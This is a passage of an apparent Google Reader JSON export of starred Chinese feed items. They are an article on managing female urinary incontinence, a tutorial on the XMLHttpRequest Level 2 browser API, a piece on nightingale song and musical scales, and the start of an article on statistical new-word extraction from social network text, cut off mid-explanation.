Brubaker）就认为，大多数患者都会经历这两种情况，实际生活中的区别可能并没有我们想象的那么大[1]。</p>\n</div>\n<div>\n<h1>对付失禁不太难</h1>\n<p>对于大多数患者来说，细微的生活方式的改变就可能对于抑制尿失禁大有裨益。下面就列出几点：</p>\n<p>-记录一下你的“饮水排尿日志”，更确切地了解自己的情况，同时这也是医生很重视的诊断材料；[4]</p>\n<p>-不要一次性喝大量的水，这会在瞬间增大膀胱的压力，可以尝试少量多饮；</p>\n<p>-咖啡因是一种典型的利尿剂，所以，少喝些可乐、咖啡之类的饮料；</p>\n<p>-适当控制一下情绪，不要忘乎所以的大笑，在咳嗽喷嚏时控制一下程度；</p>\n<p>-保持一个健康的体重；</p>\n<p>-多去几趟厕所不丢人，提前观察好奔向厕所的最短路径，把衣服穿的宽松一点，以备不时之需；</p>\n<p>-膀胱练习。尽量增加自己“憋”住的时间，控制自己的情绪，深呼吸，放慢呼吸的速度。比如现在每30分钟去一次厕所，可以逐渐延长到40分钟，50分钟，直到紧迫的症状缓解。</p>\n<p>-尝试一下简单的骨盆肌的锻炼，比如，“凯格尔”训练法。（另外，治疗尿失禁的方法还有电刺激法，生物调节反馈法等多种方法，详见[4]）</p>\n<p>针对尿失禁的手术研究也正在进行，尽管效果都算是半斤八两，但也已经有大约200多种外科手术的方法。比如，可以采用悬吊术或是吊索术，用外科手术线或是吊索支撑膀胱颈或是支撑尿道，缓解因为肌肉损伤所造成的问题，治疗压力性尿失禁。[4]</p>\n<p>最近，尿失禁治疗研究协会（Urinary Incontinence Treatment Network）的研究显示，在经过手术2年之后，采用悬吊治疗的患者容易出现尿道感染，或是急迫性尿失禁，但是仍有2/3的采用吊索治疗的患者以及大约一半的采用外科手术线悬吊治疗的患者治愈了压力性尿失禁，吊索治疗的满意率高达86%，悬吊治疗的患者满意率也有78%[4]。可见，尿失禁的手术治愈还是很有希望的。</p>\n<p>最后要提到两点，对于女性来说，大可不必过于担心，尿失禁是一种常见的情况。不必为此感到尴尬以至于难以见人。无论患者的年龄大小，绝大多数类型的尿失禁都是可以治疗的。</p>\n<p>[1] <a href=\"http://www.webmd.com/urinary-incontinence-oab/features/incontinence-womans-little-secret\">Incontinence: Common Female Bladder Problems</a></p>\n<p>[2] <a href=\"http://coe.ucsf.edu/wcc/\">UCSF Women's Continence Center Homepage</a></p>\n<p>[3] <a href=\"http://www.webmd.com/urinary-incontinence-oab/womens-guide/urinary-incontinence-in-women-topic-overview\">What is Urinary Incontinence in Women? - WebMD</a></p>\n<p>[4] <a href=\"http://kidney.niddk.nih.gov/kudiseases/pubs/uiwomen/\">Urinary Incontinence in Women - National Kidney and Urologic Diseases Information Clearinghouse</a></p>\n<p>附：kegel练习法[4]\n首先需要准确地找到盆底肌，一条方法可以借鉴，想象你坐在一个弹球上，想要用阴道把弹球夹起来，吸到阴道里；\n同时保持其他肌肉的放松，不要挤压绷紧肚子、腿、臀部的肌肉，对于其他部分肌肉的挤压可能反而会增加控制膀胱的肌肉的压力；\n重复练习，但不要过度练习。最开始可以躺下练习，这是最容易的一种姿势，没有坐姿或站姿时骨盆肌所需要承受的hold住其他器官的重力。之后，逐渐可以改为坐或站立练习。\n提紧骨盆肌，保持三秒钟，放松三秒钟，每天重复十次。</p>\n</div>\n</div>"
    },
    "author" : "北斗京华",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1347244429592",
    "timestampUsec" : "1347244429592107",
    "id" : "tag:google.com,2005:reader/item/f466084472ca1310",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "XMLHttpRequest Level 2 使用指南",
    "published" : 1347095529,
    "updated" : 1347095529,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://en.wikipedia.org/wiki/XMLHttpRequest\">XMLHttpRequest</a>是一个浏览器接口，使得Javascript可以进行HTTP(S)通信。</p><p>最早，微软在IE 5引进了这个接口。因为它太有用，其他浏览器也模仿部署了，ajax操作因此得以诞生。</p>\n\n<p>但是，这个接口一直没有标准化，每家浏览器的实现或多或少有点不同。HTML 5的概念形成后，W3C开始考虑标准化这个接口。2008年2月，就提出了<a href=\"http://dev.w3.org/2006/webapi/XMLHttpRequest-2/\">XMLHttpRequest Level 2</a> 草案。</p>\n\n<p>这个XMLHttpRequest的新版本，提出了很多有用的新功能，将大大推动互联网革新。本文就对这个新版本进行详细介绍。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201209/bg2012090801.png\"></p>\n\n<p><strong>一、老版本的XMLHttpRequest对象</strong></p>\n\n<p>在介绍新版本之前，我们先回顾一下老版本的用法。</p>\n\n<p>首先，新建一个XMLHttpRequest的实例。</p>\n\n<blockquote>\n\n<p>　　var xhr = new XMLHttpRequest();</p>\n\n</blockquote>\n\n<p>然后，向远程主机发出一个HTTP请求。</p>\n\n<blockquote>\n\n<p>　　xhr.open('GET', 'example.php');</p>\n\n<p>　　xhr.send();</p>\n\n</blockquote>\n\n<p>接着，就等待远程主机做出回应。这时需要监控XMLHttpRequest对象的状态变化，指定回调函数。</p>\n\n<blockquote>\n\n<p>　　xhr.onreadystatechange = function(){ </p>\n\n<p>　　　　if ( xhr.readyState == 4 &amp;&amp; xhr.status == 200 ) {</p>\n\n<p>　　　　　　alert( xhr.responseText );</p>\n\n<p>　　　　} else {</p>\n\n<p>　　　　　　alert( xhr.statusText );</p>\n\n<p>　　　　}</p>\n\n<p>　　}; </p>\n\n</blockquote>\n\n<p>上面的代码包含了老版本XMLHttpRequest对象的主要属性：</p>\n\n<blockquote>\n\n<p>　　* xhr.readyState：XMLHttpRequest对象的状态，等于4表示数据已经接收完毕。</p>\n\n<p>　　* xhr.status：服务器返回的状态码，等于200表示一切正常。</p>\n\n<p>　　* xhr.responseText：服务器返回的文本数据</p>\n\n<p>　　* xhr.responseXML：服务器返回的XML格式的数据</p>\n\n<p>　　* xhr.statusText：服务器返回的状态文本。</p>\n\n</blockquote>\n\n<p><strong>二、老版本的缺点</strong></p>\n\n<p>老版本的XMLHttpRequest对象有以下几个缺点：</p>\n\n<blockquote>\n\n<p>　　* 只支持文本数据的传送，无法用来读取和上传二进制文件。</p>\n\n<p>　　* 传送和接收数据时，没有进度信息，只能提示有没有完成。</p>\n\n<p>　　* 受到<a href=\"http://www.w3.org/Security/wiki/Same_Origin_Policy\">\"同域限制\"</a>（Same Origin Policy），只能向同一域名的服务器请求数据。</p>\n\n</blockquote>\n\n<p><strong>三、新版本的功能</strong></p>\n\n<p>新版本的XMLHttpRequest对象，针对老版本的缺点，做出了大幅改进。</p>\n\n<blockquote>\n\n<p>　　* 可以设置HTTP请求的时限。</p>\n\n<p>　　* 可以使用FormData对象管理表单数据。</p>\n\n<p>　　* 可以上传文件。</p>\n\n<p>　　* 可以请求不同域名下的数据（跨域请求）。</p>\n\n<p>　　* 可以获取服务器端的二进制数据。</p>\n\n<p>　　* 可以获得数据传输的进度信息。</p>\n\n</blockquote>\n\n<p>下面，我就一一介绍这些新功能。</p>\n\n<p><strong>四、HTTP请求的时限</strong></p>\n\n<p>有时，ajax操作很耗时，而且无法预知要花多少时间。如果网速很慢，用户可能要等很久。</p>\n\n<p>新版本的XMLHttpRequest对象，增加了timeout属性，可以设置HTTP请求的时限。</p>\n\n<blockquote>\n\n<p>　　xhr.timeout = 3000;</p>\n\n</blockquote>\n\n<p>上面的语句，将最长等待时间设为3000毫秒。过了这个时限，就自动停止HTTP请求。与之配套的还有一个timeout事件，用来指定回调函数。</p>\n\n<blockquote>\n\n<p>　　xhr.ontimeout = function(event){</p>\n\n<p>　　　　alert('请求超时！');</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>目前，Opera、Firefox和IE 10支持该属性，IE 8和IE 9的这个属性属于XDomainRequest对象，而Chrome和Safari还不支持。</p>\n\n<p><strong>五、FormData对象</strong></p>\n\n<p>ajax操作往往用来传递表单数据。为了方便表单处理，HTML 5新增了一个FormData对象，可以模拟表单。</p>\n\n<p>首先，新建一个FormData对象。</p>\n\n<blockquote>\n\n<p>　　var formData = new FormData();</p>\n\n</blockquote>\n\n<p>然后，为它添加表单项。</p>\n\n<blockquote>\n\n<p>　　formData.append('username', '张三');</p>\n\n<p>　　formData.append('id', 123456);</p>\n\n</blockquote>\n\n<p>最后，直接传送这个FormData对象。这与提交网页表单的效果，完全一样。</p>\n\n<blockquote>\n\n<p>　　xhr.send(formData);</p>\n\n</blockquote>\n\n<p>FormData对象也可以用来获取网页表单的值。</p>\n\n<blockquote>\n\n<p>　　var form = document.getElementById('myform');</p>\n\n<p>　　var formData = new FormData(form);</p>\n\n<p>　　formData.append('secret', '123456'); // 添加一个表单项</p>\n\n<p>　　xhr.open('POST', form.action);</p>\n\n<p>　　xhr.send(formData);</p>\n\n</blockquote>\n\n<p><strong>六、上传文件</strong></p>\n\n<p>新版XMLHttpRequest对象，不仅可以发送文本信息，还可以上传文件。</p>\n\n<p>假定files是一个\"选择文件\"的表单元素（input[type=\"file\"]），我们将它装入FormData对象。</p>\n\n<blockquote>\n\n<p>　　var formData = new FormData();</p>\n\n<p>　　for (var i = 0; i &lt; files.length;i++) {</p>\n\n<p>　　　　formData.append('files[]', files[i]);</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>然后，发送这个FormData对象。</p>\n\n<blockquote>\n\n<p>　　xhr.send(formData); </p>\n\n</blockquote>\n\n<p><strong>七、跨域资源共享（CORS）</strong></p>\n\n<p>新版本的XMLHttpRequest对象，可以向不同域名的服务器发出HTTP请求。这叫做<a href=\"http://en.wikipedia.org/wiki/Cross-Origin_Resource_Sharing\">\"跨域资源共享\"</a>（Cross-origin resource sharing，简称CORS）。 </p>\n\n<p>使用\"跨域资源共享\"的前提，是浏览器必须支持这个功能，而且服务器端必须同意这种\"跨域\"。如果能够满足上面的条件，则代码的写法与不跨域的请求完全一样。</p>\n\n<blockquote>\n\n<p>　　xhr.open('GET', 'http://other.server/and/path/to/script');</p>\n\n</blockquote>\n\n<p>目前，除了IE 8和IE 9，主流浏览器都支持CORS，IE 10也将支持这个功能。服务器端的设置，请参考<a href=\"https://developer.mozilla.org/en-US/docs/Server-Side_Access_Control\">《Server-Side Access Control》</a>。</p>\n\n<p><strong>八、接收二进制数据（方法A：改写MIMEType）</strong></p>\n\n<p>老版本的XMLHttpRequest对象，只能从服务器取回文本数据（否则它的名字就不用XML起首了），新版则可以取回二进制数据。</p>\n\n<p>这里又分成两种做法。较老的做法是改写数据的MIMEType，将服务器返回的二进制数据伪装成文本数据，并且告诉浏览器这是用户自定义的字符集。</p>\n\n<blockquote>\n\n<p>　　xhr.overrideMimeType(\"text/plain; charset=x-user-defined\");</p>\n\n</blockquote>\n\n<p>然后，用responseText属性接收服务器返回的二进制数据。</p>\n\n<blockquote>\n\n<p>　　var binStr = xhr.responseText;</p>\n\n</blockquote>\n\n<p>由于这时，浏览器把它当做文本数据，所以还必须再一个个字节地还原成二进制数据。</p>\n\n<blockquote>\n\n<p>　　for (var i = 0, len = binStr.length; i &lt; len; ++i) {</p>\n\n<p>　　　　var c = binStr.charCodeAt(i);</p>\n\n<p>　　　　var byte = c &amp; 0xff; </p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>最后一行的位运算&quot;c &amp; 0xff&quot;，表示在每个字符的两个字节之中，只保留后一个字节，将前一个字节扔掉。原因是浏览器解读字符的时候，会把字符自动<a href=\"http://web.archive.org/web/20080821092906/http://mgran.blogspot.com/2006/08/downloading-binary-streams-with.html\">解读</a>成Unicode的0xF700-0xF7ff区段。</p>\n\n<p><strong>八、接收二进制数据（方法B：responseType属性）</strong></p>\n\n<p>从服务器取回二进制数据，较新的方法是使用新增的responseType属性。如果服务器返回文本数据，这个属性的值是\"TEXT\"，这是默认值。较新的浏览器还支持其他值，也就是说，可以接收其他格式的数据。</p>\n\n<p>你可以把responseType设为blob，表示服务器传回的是二进制对象。</p>\n\n<blockquote>\n\n<p>　　var xhr = new XMLHttpRequest();</p>\n\n<p>　　xhr.open('GET', '/path/to/image.png');</p>\n\n<p>　　xhr.responseType = 'blob';</p>\n\n</blockquote>\n\n<p>接收数据的时候，用浏览器自带的Blob对象即可。</p>\n\n<blockquote>\n\n<p>　　var blob = new Blob([xhr.response], {type: 'image/png'});</p>\n\n</blockquote>\n\n<p>注意，是读取xhr.response，而不是xhr.responseText。</p>\n\n<p>你还可以将responseType设为arraybuffer，把二进制数据装在一个数组里。</p>\n\n<blockquote>\n\n<p>　　var xhr = new XMLHttpRequest();</p>\n\n<p>　　xhr.open('GET', '/path/to/image.png');</p>\n\n<p>　　xhr.responseType = \"arraybuffer\";</p>\n\n</blockquote>\n\n<p>接收数据的时候，需要遍历这个数组。</p>\n\n<blockquote>\n\n<p>　　var arrayBuffer = xhr.response;</p>\n\n<p>　　if (arrayBuffer) {</p>\n\n<p>　　　　var byteArray = new Uint8Array(arrayBuffer);</p>\n\n<p>　　　　for (var i = 0; i &lt; byteArray.byteLength; i++) {</p>\n\n<p>　　　　　　// do something</p>\n\n<p>　　　　}<br>\n　　}</p>\n\n</blockquote>\n\n<p>更详细的讨论，请看<a href=\"https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/Sending_and_Receiving_Binary_Data\">Sending and Receiving Binary Data</a>。</p>\n\n<p><strong>九、进度信息</strong></p>\n\n<p>新版本的XMLHttpRequest对象，传送数据的时候，有一个progress事件，用来返回进度信息。</p>\n\n<p>它分成上传和下载两种情况。下载的progress事件属于XMLHttpRequest对象，上传的progress事件属于XMLHttpRequest.upload对象。</p>\n\n<p>我们先定义progress事件的回调函数。</p>\n\n<blockquote>\n\n<p>　　xhr.onprogress = updateProgress;</p>\n\n<p>　　xhr.upload.onprogress = updateProgress;</p>\n\n</blockquote>\n\n<p>然后，在回调函数里面，使用这个事件的一些属性。</p>\n\n<blockquote>\n\n<p>　　function updateProgress(event) {</p>\n\n<p>　　　　if (event.lengthComputable) {</p>\n\n<p>　　　　　　var percentComplete = event.loaded / event.total;</p>\n\n<p>　　　　} </p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>上面的代码中，event.total是需要传输的总字节，event.loaded是已经传输的字节。如果event.lengthComputable不为真，则event.total等于0。</p>\n\n<p>与progress事件相关的，还有其他五个事件，可以分别指定回调函数：</p>\n\n<blockquote>\n\n<p>　　* load事件：传输成功完成。</p>\n\n<p>　　* abort事件：传输被用户取消。</p>\n\n<p>　　* error事件：传输中出现错误。</p>\n\n<p>　　* loadstart事件：传输开始。</p>\n\n<p>　　* loadEnd事件：传输结束，但是不知道成功还是失败。</p>\n\n</blockquote>\n\n<p><strong>十、阅读材料</strong></p>\n\n<p>　　1. <a href=\"http://dev.opera.com/articles/view/xhr2/\">Introduction to XMLHttpRequest Level 2</a>： 新功能的综合介绍。</p>\n\n<p>　　2. <a href=\"http://www.html5rocks.com/en/tutorials/file/xhr2/\">New Tricks in XMLHttpRequest 2</a>：一些用法的介绍。</p>\n\n<p>　　3. <a href=\"https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/Using_XMLHttpRequest\">Using XMLHttpRequest</a>：一些高级用法，主要针对Firefox浏览器。</p>\n\n<p>　　4. <a href=\"https://developer.mozilla.org/en-US/docs/HTTP_access_control\">HTTP Access Control</a>：CORS综述。</p>\n\n<p>　　5. <a href=\"http://dev.opera.com/articles/view/dom-access-control-using-cross-origin-resource-sharing/\">DOM access control using cross-origin resource sharing</a>：CORS的9种HTTP头信息</p>\n\n<p>　　6. <a href=\"https://developer.mozilla.org/en-US/docs/Server-Side_Access_Control\">Server-Side Access Control</a>：服务器端CORS设置。</p>\n\n<p>　　7. <a href=\"http://enable-cors.org/\">Enable CORS</a>：服务端CORS设置。</p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html\">http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html</a></li>\n<li>最后修改时间：2012年10月 2日 15:54</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1346562008695",
    "timestampUsec" : "1346562008695625",
    "id" : "tag:google.com,2005:reader/item/1c8fb6c80d975d80",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "鸟鸣虽美，并非音乐",
    "published" : 1346562008,
    "updated" : 1346562008,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/327603/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>安徒的生童话中，一只夜莺用歌声融化了国王的心灵，而当国王命令它跟一只镶满宝石、只会唱 “华尔兹舞曲” 的机械夜莺一起唱二重唱时，真夜莺却飞走了。这个故事包含了某种寓意——新的研究表明，虽然人类一直以来认为鸟鸣是一种音乐，统计数字却显示，这只是一种错觉。</p>\n<p>加拿大蒙特利尔麦吉尔大学（McGill University）的认知神经科学家罗伯特•查托雷（Robert Zatorre）表示（他并未参与此项研究），人类最喜爱的那些鸟鸣声多与人类的嗓音相似，这些声音有明确的音调，并由不连续的音符组成形式类似的重复的小节。虽然拥有令人愉悦的种种特点，却没有科学证据表明鸟鸣中的音符遵循大多数音乐作品中的组织规律。新研究的作者、新墨西哥州立大学的生态学家马塞洛•阿拉亚-萨拉斯（Marcelo Araya-Salas）表示：还没有人通过定量的研究方法解决这个问题。</p>\n<p>一个八度里的最低音和最高音之间存在着数十亿个可能的音。但大多数文化中的音乐都是由 5-12 个音组成，研究人员认为这一现象出现的部分原因是人类听觉上的生理限制，以及久而久之形成的文化偏好。最小型的钢琴有 88 个琴键，每个八度都被分成 12 等分，称为十二平均律，它所形成的 12 个半音音阶是大多数西方音乐的基础。而 7 个音组成的全音阶 “do，re，mi，fa，so，la，ti（do）” 又是另一个相似的例子。还有古代的五音，五声音阶常见于古希腊的里拉琴演奏中，现在的电吉他演奏的重复乐段（Riff）中也基本上都有。</p>\n<p>与钢琴不同，人类和鸟类能在不同的音高间自然转换，不用注意特定的音阶，也模糊了间隔。大多数情况下，人们并不会认为突然的随机发声能称为 “音乐”，就像查托雷说的那样 “我们不是 ‘喔噢喔噢噢噢噢噢’ 地唱歌的”。爵士歌手可能会在歌曲中吼两嗓子以增加感染力，但吼叫的音符本身是稳定且在一个可辨识的音阶中的。</p>\n<p>要确定鸟鸣是否保有这些音符之间的稳定关系，阿拉亚萨拉斯设计了一个统计测验，来测量鸟鸣中遵循音阶的连续音符出现频率是多少。他用生活在北哥斯达黎加和墨西哥南部的森林中的夜莺作为测试对象，记录并分析了 81 只鸟的鸣叫声，测量每个音符之间的频率差别，寻找与全音阶、五声音阶和半音阶相同的音程。为了确保他的统计分析有效，他先用 24 首乐曲进行了测试，其中包括巴赫的《无伴奏大提琴组曲》和爵士乐《秋叶》。这些乐曲都是用类似鸟类声带的乐器演奏的，比如大提琴、小提琴、长号，能形成音符间的自然转变。</p>\n<p>这项新研究发表在本月的《动物行为学》（ <em>Animal Behavior</em> ）杂志上，结果表明夜莺的歌声和音乐之间的相似性只不过是一个巧合。通过 243 次比较，阿拉亚萨亚斯发现夜莺的歌声和音阶只有 6 个相匹配的和声音程。鸟鸣确实优美，但称其为音乐却只是人类自己的看法。</p>\n<p>查托雷表示，发生这种误会是很自然的，当人听到不懂的语言时，也会试图从中找出相似的地方，与自己了解的词汇对应起来，所以人们会把一小部分与普通音阶相似的鸟鸣当作音乐。尽管鸟鸣对鸟类有明确的意义，但恐怕与我们的想象也大相径庭。</p>\n<p>伊利诺斯州埃文斯顿西本大学的神经科学家亚当•蒂尔尼（Adam Tierney）致力于研究人类音乐与鸟鸣之间的物理基础。他对这项研究的严谨性提出了质疑，因为只用一个物种的鸟鸣声不足以概括所有的鸟鸣。不过，这项研究的确证明了夜莺的歌声是不遵循西方的音阶的。但还是那句话，即使鸟鸣不是音乐，但也并不意味着鸟鸣是没有意义的，只是不是人类意义上的 “音乐” 罢了。</p>\n<div>\n<div><br></div>\n</div>\n<div>\n<div><br></div>\n</div>\n<table>\n<col>\n<col>\n<tbody valign=\"top\">\n<tr><th>编译自:</th><td>Science，Birdsong Not Music, After All</td>\n</tr>\n<tr><th>文章图片:</th><td>John Gerrard Keulemans (1902); Biologia Centrali-Americana (1879–1904)，via news.sciencemag.org</td>\n</tr>\n</tbody>\n</table>\n</div>"
    },
    "author" : "蘇蘇蘇蘇子",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1346477774236",
    "timestampUsec" : "1346477774236115",
    "id" : "tag:google.com,2005:reader/item/065f1e3d102137b2",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "语言学", "Brain Storm", "统计", "算法" ],
    "title" : "互联网时代的社会语言学：基于SNS的文本数据挖掘",
    "published" : 1344593035,
    "updated" : 1344593035,
    "alternate" : [ {
      "href" : "http://www.matrix67.com/blog/archives/5044",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>    今年上半年，我在人人网实习了一段时间，期间得到了很多宝贵的数据，并做了一些还算有意义的事情，在这里和大家一块儿分享。感谢人人网提供的数据与工作环境，感谢赵继承博士、詹卫东老师的支持和建议。在这项工作中，我得到了很多与众人交流的机会，特别感谢 OpenParty 、 TEDxBeijing 提供的平台。本文已发表在了《程序员》杂志，分上下两部分刊于 2012 年 7 月刊和 8 月刊，在此感谢卢鸫翔编辑的辛勤工作。由于众所周知的原因，《程序员》刊出的文章被和谐过（看到后面大家就自动地知道被和谐的内容是什么了），因而我决定把完整版发在 Blog 上，同时与更多的人一同分享。对此感兴趣的朋友可以给我发邮件继续交流。好了，开始说正文吧。</p>\n<p>    作为中文系应用语言学专业的学生以及一名数学 Geek ，我非常热衷于用计算的方法去分析汉语资料。汉语是一种独特而神奇的语言。对汉语资料进行自然语言处理时，我们会遇到很多其他语言不会有的困难，比如分词——汉语的词与词之间没有空格，那计算机怎么才知道，“已结婚的和尚未结婚的青年都要实行计划生育”究竟说的是“已／结婚／的／和／尚未／结婚／的／青年”，还是“已／结婚／的／和尚／未／结婚／的／青年”呢？这就是所谓的分词歧义难题。不过，现在很多语言模型已经能比较漂亮地解决这一问题了。但在中文分词领域里，还有一个比分词歧义更令人头疼的东西——未登录词。中文没有首字母大写，专名号也被取消了，这叫计算机如何辨认人名地名之类的东西？更惨的则是机构名、品牌名、专业名词、缩略语、网络新词等等，它们的产生机制似乎完全无规律可寻。最近十年来，中文分词领域都在集中攻克这一难关。自动发现新词成为了关键的环节。</p>\n<p>    挖掘新词的传统方法是，先对文本进行分词，然后猜测未能成功匹配的剩余片段就是新词。这似乎陷入了一个怪圈：分词的准确性本身就依赖于词库的完整性，如果词库中根本没有新词，我们又怎么能信任分词结果呢？此时，一种大胆的想法是，首先不依赖于任何已有的词库，仅仅根据词的共同特征，将一段大规模语料中可能成词的文本片段全部提取出来，不管它是新词还是旧词。然后，再把所有抽出来的词和已有词库进行比较，不就能找出新词了吗？有了抽词算法后，我们还能以词为单位做更多有趣的数据挖掘工作。这里，我所选用的语料是人人网 2011 年 12 月前半个月部分用户的状态。非常感谢人人网提供这份极具价值的网络语料。</p>\n<p><span></span><br>\n <br>\n <br>\n    要想从一段文本中抽出词来，我们的第一个问题就是，怎样的文本片段才算一个词？大家想到的第一个标准或许是，看这个文本片段出现的次数是否足够多。我们可以把所有出现频数超过某个阈值的片段提取出来，作为该语料中的词汇输出。不过，光是出现频数高还不够，一个经常出现的文本片段有可能不是一个词，而是多个词构成的词组。在人人网用户状态中，“的电影”出现了 389 次，“电影院”只出现了 175 次，然而我们却更倾向于把“电影院”当作一个词，因为直觉上看，“电影”和“院”凝固得更紧一些。</p>\n<p>    为了证明“电影院”一词的内部凝固程度确实很高，我们可以计算一下，如果“电影”和“院”真的是各自独立地在文本中随机出现，它俩正好拼到一起的概率会有多小。在整个 2400 万字的数据中，“电影”一共出现了 2774 次，出现的概率约为 0.000113 。“院”字则出现了 4797 次，出现的概率约为 0.0001969 。如果两者之间真的毫无关系，它们恰好拼在了一起的概率就应该是 0.000113 × 0.0001969 ，约为 2.223 × 10<sup>-8</sup> 次方。但事实上，“电影院”在语料中一共出现了 175 次，出现概率约为 7.183 × 10<sup>-6</sup> 次方，是预测值的 300 多倍。类似地，统计可得“的”字的出现概率约为 0.0166 ，因而“的”和“电影”随机组合到了一起的理论概率值为 0.0166 × 0.000113 ，约为 1.875 × 10<sup>-6</sup> ，这与“的电影”出现的真实概率很接近——真实概率约为 1.6 × 10<sup>-5</sup> 次方，是预测值的 8.5 倍。计算结果表明，“电影院”更可能是一个有意义的搭配，而“的电影”则更像是“的”和“电影”这两个成分偶然拼到一起的。</p>\n<p>    当然，作为一个无知识库的抽词程序，我们并不知道“电影院”是“电影”加“院”得来的，也并不知道“的电影”是“的”加上“电影”得来的。错误的切分方法会过高地估计该片段的凝合程度。如果我们把“电影院”看作是“电”加“影院”所得，由此得到的凝合程度会更高一些。因此，为了算出一个文本片段的凝合程度，我们需要枚举它的凝合方式——这个文本片段是由哪两部分组合而来的。令 p(x) 为文本片段 x 在整个语料中出现的概率，那么我们定义“电影院”的凝合程度就是 p(电影院) 与 p(电) · p(影院) 比值和 p(电影院) 与 p(电影) · p(院) 的比值中的较小值，“的电影”的凝合程度则是 p(的电影) 分别除以 p(的) · p(电影) 和 p(的电) · p(影) 所得的商的较小值。</p>\n<p>    可以想到，凝合程度最高的文本片段就是诸如“蝙蝠”、“蜘蛛”、“彷徨”、“忐忑”、“玫瑰”之类的词了，这些词里的每一个字几乎总是会和另一个字同时出现，从不在其他场合中使用。</p>\n<p> <br>\n    光看文本片段内部的凝合程度还不够，我们还需要从整体来看它在外部的表现。考虑“被子”和“辈子”这两个片段。我们可以说“买被子”、“盖被子”、“进被子”、“好被子”、“这被子”等等，在“被子”前面加各种字；但“辈子”的用法却非常固定，除了“一辈子”、“这辈子”、“上辈子”、“下辈子”，基本上“辈子”前面不能加别的字了。“辈子”这个文本片段左边可以出现的字太有限，以至于直觉上我们可能会认为，“辈子”并不单独成词，真正成词的其实是“一辈子”、“这辈子”之类的整体。可见，文本片段的自由运用程度也是判断它是否成词的重要标准。如果一个文本片段能够算作一个词的话，它应该能够灵活地出现在各种不同的环境中，具有非常丰富的左邻字集合和右邻字集合。</p>\n<p>    “信息熵”是一个非常神奇的概念，它能够反映知道一个事件的结果后平均会给你带来多大的信息量。如果某个结果的发生概率为 p ，当你知道它确实发生了，你得到的信息量就被定义为 - log(p) 。 p 越小，你得到的信息量就越大。如果一颗骰子的六个面分别是 1 、 1 、 1 、 2 、 2 、 3 ，那么你知道了投掷的结果是 1 时可能并不会那么吃惊，它给你带来的信息量是 - log(1/2) ，约为 0.693 。知道投掷结果是 2 ，给你带来的信息量则是 - log(1/3) ≈ 1.0986 。知道投掷结果是 3 ，给你带来的信息量则有 - log(1/6) ≈ 1.79 。但是，你只有 1/2 的机会得到 0.693 的信息量，只有 1/3 的机会得到 1.0986 的信息量，只有 1/6 的机会得到 1.79 的信息量，因而平均情况下你会得到 0.693/2 + 1.0986/3 + 1.79/6 ≈ 1.0114 的信息量。这个 1.0114 就是那颗骰子的信息熵。现在，假如某颗骰子有 100 个面，其中 99 个面都是 1 ，只有一个面上写的 2 。知道骰子的抛掷结果是 2 会给你带来一个巨大无比的信息量，它等于 - log(1/100) ，约为 4.605 ；但你只有百分之一的概率获取到这么大的信息量，其他情况下你只能得到 - log(99/100) ≈ 0.01005 的信息量。平均情况下，你只能获得 0.056 的信息量，这就是这颗骰子的信息熵。再考虑一个最极端的情况：如果一颗骰子的六个面都是 1 ，投掷它不会给你带来任何信息，它的信息熵为 - log(1) = 0 